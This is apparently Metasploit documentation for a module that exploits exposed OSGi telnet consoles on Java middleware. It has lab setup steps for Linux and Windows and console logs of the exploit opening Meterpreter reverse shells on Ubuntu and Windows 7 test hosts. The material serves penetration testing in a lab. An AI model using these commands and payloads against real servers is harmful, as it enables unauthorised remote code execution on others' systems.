## Vulnerable Application

### Description

This module takes advantage of OSGi consoles exposed by some Java-based middleware servers.

The OSGi console is a telnet-based server that can be used for remote debugging and dynamic loading/removal of Java bundles running on an OSGi based server.

#### References

* OSGi Console - Gateway to (s)hell - https://qkaiser.github.io/pentesting/2018/02/13/osgi-console/
* Eclipse Equinoxe OSGi console - https://www.eclipse.org/equinox/documents/quickstart-framework.php

### Test setup

#### Linux environment

Follow these steps to run the vulnerable application on a Linux host:

1. Create a test environment directory
`mkdir testenv && cd testenv`
2. Download the setup script
`wget https://gist.githubusercontent.com/QKaiser/66c8a618eef2a7801c0bbb1aa43d724a/raw/e098f6ea31717311bd6ce5b3be94744dddfc2388/setup.sh`
3. Set appropriate permission
`chmod +x setup.sh`
4. Execute setup script
`./setup.sh`
5. Launch the vulnerable application with this command so it listens on port TCP/5555
`java -jar org.eclipse.osgi.jar -console 5555`
6. Verify that the server is running, you should be prompted with `osgi> `
`telnet localhost 5555`
7. From the telnet console, enable the second second server. This one listens on port 2019 by default. Set the IP to an address linked to an external interface if attacker machine is on another host.
`telnetd --ip=127.0.0.1 start`

#### Windows environment

Follow these steps to run the vulnerable application on a Windows host:

1. Download the Eclipse Equinoxe SDK from https://www.eclipse.org/downloads/download.php?file=/equinox/drops/R-Oxygen.2-201711300510/equinox-SDK-Oxygen.2.zip&r=1
2. Create a test directory. Let's name it `osgi_test` for clarity.
3. Create a directory named `configuration` in `osgi_test`
4. Create a file named `config.ini` in your `configuration` directory. The file should contain the following lines only:
```
osgi.bundles=org.eclipse.equinox.console@start, org.apache.felix.gogo.command@start, org.apache.felix.gogo.shell@start, org.apache.felix.gogo.runtime@start
eclipse.ignoreApp=true
osgi.noShutdown=true
```
5. Create an empty `plugins` directory in `osgi_test` directory
6. Extract `plugins/org.apache.felix.gogo.command_(version).jar` from the SDK as `org.apache.felix.gogo.command.jar` in `osgi_test` directory. 
7. Extract `plugins/org.apache.felix.gogo.runtime_(version).jar` from the SDK as `org.apache.felix.gogo.runtime.jar` in `osgi_test` directory.
6. Extract `plugins/org.apache.felix.gogo.shell_(version).jar` from the SDK as `org.apache.felix.gogo.shell.jar` in `osgi_test` directory.
8. Extract `plugins/org.eclipse.equinox.console_(version).jar` from the SDK as `org.eclipse.equinox.console.jar` in `osgi_test` directory.
9. Extract `plugins/org.eclipse.osgi_(version).jar` from the SDK as `org.eclipse.osgi.jar` in `osgi_test` directory.
10. At the end of those steps, your `osgi_test` directory should contain the following items:
```
.
├── configuration
│   └── config.ini
├── org.apache.felix.gogo.command.jar
├── org.apache.felix.gogo.runtime.jar
├── org.apache.felix.gogo.shell.jar
├── org.eclipse.equinox.console.jar
├── org.eclipse.osgi.jar
└── plugins
```
11. Launch the vulnerable application with this command so it listens on port TCP/5555
`java -jar org.eclipse.osgi.jar -console 5555`
12. Verify that the server is running, you should be prompted with `osgi> `
`telnet localhost 5555`
13. From the telnet console, enable the second second server. This one listens on port 2019 by default. Set the IP to an address linked to an external interface if attacker machine is on another host.
`telnetd --ip=127.0.0.1 start`

If you don't want to go through all those steps manually I recommend you to run the setup script on a Linux host, mount the directory on a Windows VM and start from step 11.

## Verification Steps

You can verify the module against the vulnerable application with those steps:

  1. Install the application
  2. Start msfconsole
  3. Do: `use exploit/multi/misc/osgi_console_exec`
  4. Do: `set RHOST 127.0.0.1`
  5. Do: `set RPORT 5555` or `set RPORT 2019`
  6. Do: `check`. The target should appear vulnerable.
  6. Do: `set payload` with the payload of your choosing.
  5. Do: `run`
  5. You should get a shell.

## Options

  **TIME_WAIT** - Time to wait for payload to be executed. The default value is set to 20 seconds.

## Scenarios

### Reverse shell on Linux host

Exploit running against a Ubuntu Linux target:

```
msf5 > use exploit/multi/misc/osgi_console_exec
msf5 exploit(multi/misc/osgi_console_exec) > set RHOST 172.20.10.4
msf5 exploit(multi/misc/osgi_console_exec) > set RPORT 5555
msf5 exploit(multi/misc/osgi_console_exec) > set TARGET 0
msf5 exploit(multi/misc/osgi_console_exec) > set payload linux/x86/meterpreter/reverse_tcp
msf5 exploit(multi/misc/osgi_console_exec) > set LHOST 172.20.10.2
msf5 exploit(multi/misc/osgi_console_exec) > set LPORT 4444
msf5 exploit(multi/misc/osgi_console_exec) > run
[*] Exploit running as background job 1.
[*] Started reverse TCP handler on 172.20.10.2:4444
[*] 172.20.10.4:5555 - Accessing the OSGi console ...
[*] 172.20.10.4:5555 - Exploiting...
[*] Sending stage (857352 bytes) to 172.20.10.4
[*] 172.20.10.4:5555 - 172.20.10.4:5555 - Waiting for session...
[*] Meterpreter session 2 opened (172.20.10.2:4444 -> 172.20.10.4:39314) at 2018-02-14 19:17:39 +0100
[*] 172.20.10.4:5555 - Command Stager progress - 100.00% done (763/763 bytes)

msf5 exploit(multi/misc/osgi_console_exec) > sessions -i 2
[*] Starting interaction with 2...
meterpreter > sysinfo
Computer     : 172.20.10.4
OS           : Ubuntu 16.04 (Linux 4.4.0-38-generic)
Architecture : x64
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux

```

### Reverse shell on Windows host

Exploit running against a Windows 7 target:

```
msf5 > use exploit/multi/misc/osgi_console_exec
msf5 exploit(multi/misc/osgi_console_exec) > set RHOST 172.20.10.3
msf5 exploit(multi/misc/osgi_console_exec) > set RPORT 5555
msf5 exploit(multi/misc/osgi_console_exec) > set TARGET 1
msf5 exploit(multi/misc/osgi_console_exec) > set payload windows/meterpreter/reverse_tcp
msf5 exploit(multi/misc/osgi_console_exec) > set LHOST 172.20.10.2
msf5 exploit(multi/misc/osgi_console_exec) > set LPORT 4444
msf5 exploit(multi/misc/osgi_console_exec) > run
[*] Exploit running as background job 2.
[*] Started reverse TCP handler on 172.20.10.2:4444
[*] 172.20.10.3:5555 - Accessing the OSGi console ...
[*] 172.20.10.3:5555 - Exploiting...
[*] 172.20.10.3:5555 - 172.20.10.3:5555 - Waiting for session...
[*] Sending stage (179779 bytes) to 172.20.10.3
[*] Meterpreter session 1 opened (172.20.10.2:4444 -> 172.20.10.3:49365) at 2018-02-14 19:14:15 +0100
msf5 exploit(multi/misc/osgi_console_exec) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > sysinfo
Computer        : PENTEST-PC
OS              : Windows 7 (Build 7601, Service Pack 1).
Architecture    : x86
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
```
